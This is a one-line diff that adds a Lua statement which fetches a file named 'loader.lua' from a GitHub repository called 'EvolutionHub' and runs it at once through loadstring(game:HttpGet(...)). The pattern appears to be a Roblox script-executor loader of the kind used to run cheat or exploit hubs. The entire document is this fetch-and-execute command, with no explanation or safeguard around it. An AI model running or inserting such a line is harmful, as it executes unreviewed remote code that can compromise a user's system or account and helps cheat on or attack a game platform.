@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Serl1cia/EvolutionHub/refs/heads/main/loader.lua"))()
